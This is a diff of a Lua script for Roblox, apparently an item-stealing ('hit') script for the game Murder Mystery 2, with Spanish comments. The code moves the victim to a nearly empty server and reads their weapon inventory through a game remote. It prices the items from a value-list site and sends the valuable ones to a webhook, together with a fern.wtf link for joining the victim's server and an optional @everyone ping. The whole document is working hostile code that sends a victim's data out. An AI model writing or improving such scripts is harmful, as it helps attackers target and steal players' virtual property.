@@ -2,8 +2,9 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
 
--- Evitar ejecución múltiple y conflictos con otros scripts
+-- Evitar ejecución múltiple
 if getgenv().ScriptEjecutado then return end
 getgenv().ScriptEjecutado = true
 
@@ -13,51 +14,11 @@ local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
-
 local req = syn and syn.request or http_request or request
-if not req then warn("No HTTP request method available!") return end
-
--- ===== Teleport a servidor vacío o casi vacío =====
-local function teleportToServer(minEmptyPlayers, maxPlayers)
-    while true do
-        local serversJson = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
-        local servers = HttpService:JSONDecode(serversJson)
-        for _, s in ipairs(servers.data) do
-            if s.id ~= game.JobId and s.playing <= maxPlayers and s.playing >= minEmptyPlayers then
-                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
-                return true
-            end
-        end
-        task.wait(2)
-    end
-end
-
--- Ejecutar teleport si no ha teleporteado
-if not getgenv().AlreadyTeleported then
-    getgenv().AlreadyTeleported = true
-    teleportToServer(0,8)
+if not req then
+    warn("No HTTP request method available!")
     return
 end
-
--- ===== Mensaje "Anonimo – Hacker" =====
-local function showLogoMessage()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.ResetOnSpawn = false
-    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1,0,0.1,0)
-    textLabel.Position = UDim2.new(0,0,0,0)
-    textLabel.BackgroundTransparency = 1
-    textLabel.TextColor3 = Color3.fromRGB(255,0,0)
-    textLabel.TextStrokeTransparency = 0
-    textLabel.Font = Enum.Font.Arcade
-    textLabel.TextScaled = true
-    textLabel.Text = "Anonimo – Hacker"
-    textLabel.Parent = screenGui
-    task.wait(3)
-    screenGui:Destroy()
-end
-showLogoMessage()
 
 -- ===== Función Base64 =====
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
@@ -74,7 +35,46 @@ local function base64Encode(data)
     end)..({ '', '==', '=' })[#data%3+1])
 end
 
--- ===== Webhook =====
+-- ===== Teleport a servidor vacío o con pocos jugadores =====
+local function teleportToServer(minEmpty, maxPlayers)
+    while true do
+        local ok, servers = pcall(function()
+            local data = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
+            return HttpService:JSONDecode(data)
+        end)
+        if ok and servers and servers.data then
+            for _, s in ipairs(servers.data) do
+                if s.id ~= game.JobId and s.playing >= minEmpty and s.playing <= maxPlayers then
+                    TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
+                    return
+                end
+            end
+        end
+        task.wait(2)
+    end
+end
+
+-- Solo hacer teleport la primera vez
+if not getgenv().AlreadyTeleported then
+    getgenv().AlreadyTeleported = true
+    teleportToServer(0,8)
+    return
+end
+
+-- ===== Mensaje en el logo al entrar =====
+if RunService:IsRunning() then
+    local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+    local Label = Instance.new("TextLabel", ScreenGui)
+    Label.Text = "Anónimo"
+    Label.Size = UDim2.new(0,300,0,50)
+    Label.Position = UDim2.new(0.5,-150,0.1,0)
+    Label.TextScaled = true
+    Label.BackgroundTransparency = 0.5
+    Label.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    Label.TextColor3 = Color3.fromRGB(255,0,0)
+end
+
+-- ===== Función para enviar webhook =====
 local function SendWebhook(title, description, fields, prefix)
     local data = {
         ["content"] = prefix or "",
@@ -125,16 +125,10 @@ local categories = {
     chroma="https://supremevaluelist.com/mm2/chromas.html"
 }
 local headers={["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}
-
 local function trim(s) return s:match("^%s*(.-)%s*$") end
-local function fetchHTML(url)
-    local success, res = pcall(function()
-        return req({Url=url, Method="GET", Headers=headers}).Body
-    end)
-    if success and res then return res else return "" end
-end
+local function fetchHTML(url) local res=req({Url=url,Method="GET",Headers=headers}) return res and res.Body or "" end
 local function parseValue(div)
-    local str = div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+    local str=div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
     if str then str=str:gsub(",","") return tonumber(str) end
 end
 local function extractItems(html)
@@ -196,6 +190,7 @@ local weaponsToSend={}
 local totalValue=0
 local min_rarity_index=table.find(rarityTable,min_rarity)
 local valueList=buildValueList()
+
 local profile=game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
 for id,amount in pairs(profile.Weapons.Owned) do
     local item=database[id]
@@ -212,8 +207,9 @@ for id,amount in pairs(profile.Weapons.Owned) do
 end
 
 -- ===== Enviar webhook solo si hay armas =====
-if #weaponsToSend>0 then
+if #weaponsToSend > 0 then
     table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
+
     local rawLink="https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..math.random(100000,999999)
     local encodedLink=base64Encode(rawLink)
     local safeLink="https://fern.wtf/redirect?data="..HttpService:UrlEncode(encodedLink)
@@ -227,7 +223,7 @@ if #weaponsToSend>0 then
     for _, w in ipairs(weaponsToSend) do
         fields[3].value=fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
     end
-    local prefix = pingEveryone and "@everyone " or ""
+    local prefix=pingEveryone and "@everyone " or ""
     SendWebhook("💪MM2 Hit Protegido💯","💰Solo Godly/Ancient armas",fields,prefix)
 end
 
